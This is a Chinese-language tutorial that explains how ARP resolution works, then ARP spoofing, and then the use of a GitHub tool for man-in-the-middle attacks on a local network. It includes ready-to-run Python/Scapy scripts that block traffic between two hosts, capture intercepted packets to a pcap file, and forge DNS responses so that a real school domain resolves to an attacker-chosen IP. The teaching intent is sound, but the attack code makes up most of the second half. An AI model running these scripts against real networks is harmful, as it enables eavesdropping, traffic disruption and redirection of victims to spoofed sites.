# Address Resolution Protocol

## Address Resolution Protocol

如果在區域網路中有三臺電腦

```
A
------------------------
IP  : 192.168.0.1
MAC : 00:00:00:00:00:01

B
------------------------
IP  : 192.168.0.2
MAC : 00:00:00:00:00:02

C
------------------------
IP  : 192.168.0.3
MAC : 00:00:00:00:00:03
```

C 想要傳訊息給 `192.168.0.1`，C 就必須要知道 A 的 MAC。C 會送一個 ARP request 封包

```
ARP request
------------------------
SRC : 00:00:00:00:00:03
DST : FF:FF:FF:FF:FF:FF
MSG : 誰是 192.168.0.1 ?
```

其中 DST 的 `FF:FF:FF:FF:FF:FF` 代表廣播的意思，然後 MSG 代表這個 ARP 封包的意思，而非封包中的某一個欄位

這個封包送出去後 A 和 B 都會收到（因為是廣播），然後 B 會因為自己的 IP 是 `192.168.0.2` 所以不去理會這個封包，但 A 因為 IP 是 `192.168.0.1` 所以會對這個封包做一個 ARP response

```
ARP response
------------------------
SRC : 00:00:00:00:00:01
DST : 00:00:00:00:00:03
MSG : 我是 192.168.0.1
```

當 C 收到這個封包後就可以從 SRC 知道 `192.168.0.1` 的 MAC 是 `00:00:00:00:00:01` 了，接著 C 就會把 `192.168.0.1` 對應到的 MAC `00:00:00:00:00:01` 紀錄到 ARP cache 並設定有效時間，在有效時間內 C 就不會再用 ARP 去詢問 A 的 MAC 而是直接用 cache 的資料。

查看目前的 ARP cache

```shell
arp -a
```


---
## ARP Spoofing

如果 C 當前的 ARP cache 長

```
C's ARP cache
------------------------
192.168.0.1 : 00:00:00:00:00:01
```

言下之意就是只要這一條 ARP cache 沒有過期，那 C 想傳訊息給 A 都會傳到 `00:00:00:00:00:01` 這裡。

但如果 B 傳一個 ARP response

```
ARP response
------------------------
SRC : 00:00:00:00:00:02
DST : 00:00:00:00:00:03
MSG : 我是 192.168.0.1
```

那這樣 C 的 ARP cache 就會被 update 成

```
C's ARP cache
------------------------
192.168.0.1 : 00:00:00:00:00:02
```

所以 C 想要傳給 A 都會傳到 `00:00:00:00:00:02`，也就是說會實際上傳給 A 的資料會傳給 B


---
## Tools-ARP_Spoofing Usage

> Github : [Tools-ARP_Spoofing](https://github.com/Curious-Lucifer/Tools-ARP_Spoofing)

首先先 install 相關的 package

```shell
pip3 install -r requirements.txt
```

接著 import `ARP_Spoofing`

```python
from ARP_Spoofing import *
```

而後寫一個繼承 `ARP_Spoofing_MITM` 的 class，並且需要實作三個 function

```python
class Example(ARP_Spoofing_MITM):
    def __init__(self, target0_ip: str, target1_ip: str):
        super().__init__(target0_ip, target1_ip)
        #

    def mitm2target1(self, pkg):
        #

    def mitm2target0(self, pkg):
        # 
```

首先就是 `ARP_Spoofing_MITM` 的 `__init__` 會需要兩個參數 `target0_ip` 和 `target1_ip`，這兩個參數是區域網路中我們要 ARP Spoofing 的兩個 IP

再來是 `mitm2target1`，當 `target0` 有封包想要傳給 `target1` 的時候，封包會被 `ARP_Spoofing_MITM` 或他的子 class 攔截，然後 `mitm2target1` 會被呼叫，並且 `pkg` 就是攔截到的封包（`Scapy` 的封包形式，只有 IP 層以上的部分）。我們可以自訂 `mitm2target1` 中的程式碼對 `pkg` 做各種操作，然後 `mitm2target1` 需要回傳一個 list，list 中的元素都是 `Scapy` 的封包形式，這些封包都會被送到 `target1`

同樣道理 `mitm2target0` 會在 `target1` 想傳訊息給 `target0` 的時候被呼叫到，並且把 `target1` 傳的封包 IP 層以上以 `Scapy` 封包形式給 `pkg`，而後經過我們自訂的程式碼處理後回傳一個都是 `Scapy` 封包形式的 list，這樣 `ARP_Spoofing_MITM` 就會把 list 中的封包都傳給 `target0`


---
## Tools-ARP_Spoofing Examples

> Github : [Tools-ARP_Spoofing](https://github.com/Curious-Lucifer/Tools-ARP_Spoofing)

### Block

```py
from ARP_Spoofing import *

class ARP_Spoofing_Block(ARP_Spoofing_MITM):
    def __init__(self, target0_ip: str, target1_ip: str):
        super().__init__(target0_ip, target1_ip)

    def mitm2target1(self, pkg):
        return []

    def mitm2target0(self, pkg):
        return []


mitm = ARP_Spoofing_Block('10.211.55.5', '10.211.55.1')
mitm.start()

input()
```

首先

```py
mitm = ARP_Spoofing_Block('10.211.55.5', '10.211.55.1')
```

指定 `target0` 是 `10.211.55.5` 和 `target1` 是 `10.211.55.1`，當執行到

```py
mitm.start()
```

的時候 `ARP_Spoofing_Block` 會做以下幾件事

1. 把 `target0` ARP cache 中 `target1` 的 MAC spoof 成 localhost 的 MAC
2. 把 `target1` ARP cache 中 `target0` 的 MAC spoof 成 localhost 的 MAC
3. 當 `target0` 想要傳訊息給 `target1` 的時候，會把封包傳給 localhost，然後 `ARP_Spoofing_Block` 會把這個封包攔截然後呼叫 `mitm2target1`，因為不管收到了什麼封包 `mitm2target1` 都會回傳空 list，所以可以視為 `target0` 傳給 `target1` 的所有訊息都會被阻擋
4. 同理當 `target1` 想要傳訊息給 `target0` 的時候，會把封包傳給 localhost，然後 `ARP_Spoofing_Block` 會把這個封包攔截然後呼叫 `mitm2target0`，同樣因為不管收到了什麼封包 `mitm2target0` 都會回傳空 list，所以可以視為 `target1` 傳給 `target0` 的所有訊息都會被阻擋

由此 `target0` 和 `target1` 之間就完全沒有辦法通訊（IP 層以上）

當這個程式結束的時候，`ARP_Spoofing_Block` 會再 spoofing 一次 `target0` 和 `target1`，把他們的 ARP cache 回歸正常，可以正常的通訊


### Intercept

```py
from ARP_Spoofing import *

class ARP_Spoofing_Intercept(ARP_Spoofing_MITM):
    def __init__(self, target0_ip: str, target1_ip: str, pcap_filename: str):
        super().__init__(target0_ip, target1_ip)
        self.pcap_filename = pcap_filename

    def mitm2target1(self, pkg):
        print('target0 -> target1', pkg)
        wrpcap(self.pcap_filename, pkg, append=True)
        return [pkg]

    def mitm2target0(self, pkg):
        print('target1 -> target0', pkg)
        wrpcap(self.pcap_filename, pkg, append=True)
        return [pkg]


mitm = ARP_Spoofing_Intercept('10.211.55.5', '10.211.55.1', 'intercept.pcap')
mitm.start()

input()
```

這個例子在 `mitm2target1` 和 `mitm2target0` 的實作上加了一點不一樣的東西，首先就是 

```py
print('target0 -> target1', pkg)
print('target1 -> target0', pkg)
```

這兩個是用來簡短的顯示 `target0` 和 `target1` 互相傳了什麼，接著

```py
wrpcap(self.pcap_filename, pkg, append=True)
```

這是用來把攔截到的封包寫入指定的 pcap 檔

最後直接回傳

```py
return [pkg]
```

也就是不對攔截到的封包做任何改動，直接 forward

### DNS Hijack

```py
from ARP_Spoofing import *

class ARP_Spoofing_DNS_Hijack(ARP_Spoofing_MITM):
    def __init__(self, target0_ip: str, target1_ip: str, hijack_domain: str, hijack_ip: str):
        super().__init__(target0_ip, target1_ip)
        self.hijack_domain = hijack_domain
        self.hijack_ip = hijack_ip

    def mitm2target1(self, pkg):
        if (DNS in pkg) and (pkg[DNS].qr == 0) and (pkg[DNS].qd.qtype == 1) and (pkg[DNS].qd.qname == self.hijack_domain.encode() + b'.'):
            dns_resp_pkg = IP(src=pkg[IP].dst, dst=pkg[IP].src) / \
                UDP(dport=pkg[UDP].sport) / \
                DNS(
                    id = pkg[DNS].id, 
                    qr = 1,
                    qd = pkg[DNS].qd.copy(), 
                    an = DNSRR(rrname=self.hijack_domain, type='A', ttl=600, rdata=self.hijack_ip)
                )
            self._mitm2target0(dns_resp_pkg)
            print('Send DNS fake response')
            return []
        return [pkg]

    def mitm2target0(self, pkg):
        return [pkg]

mitm = ARP_Spoofing_DNS_Hijack('10.211.55.5', '10.211.55.1', 'highschool.kh.edu.tw', '10.211.55.6')
mitm.start()

input()
```

首先因為 `10.211.55.1` 是 `10.211.55.5` 的 default gateway，所以只要非區域網路內的通訊都會經過 `10.211.55.1`。而 `ARP_Spoofing_DNS_Hijack` 做的事情就是當 `10.211.55.5` 想要訪問 `highschool.kh.edu.tw` 的時候會先送一個 DNS query 詢問 domain 的 IP，然後 `ARP_Spoofing_DNS_Hijack` 就會攔截這個封包，然後構造一個假的 `DNS response` 用 

```py
self._mitm2target0(dns_resp_pkg)
```

直接回給 `10.211.55.5`，這樣 `10.211.55.5` 就會認為 `highschool.kh.edu.tw` 的 IP 是 `10.211.55.6`，從而 DNS 的 cache 就被我們 hijack 了

另外可以用

```shell
resolvectl query [domain]
```

去查看 `domain` 對應的 IP（如果目前電腦的 DNS cache 沒有 `domain` 對應的紀錄，那 `resolvectl` 就會自動發 DNS query 去問）

然後可以用

```shell
resolvectl flush-caches
```

來清理 DNS cache
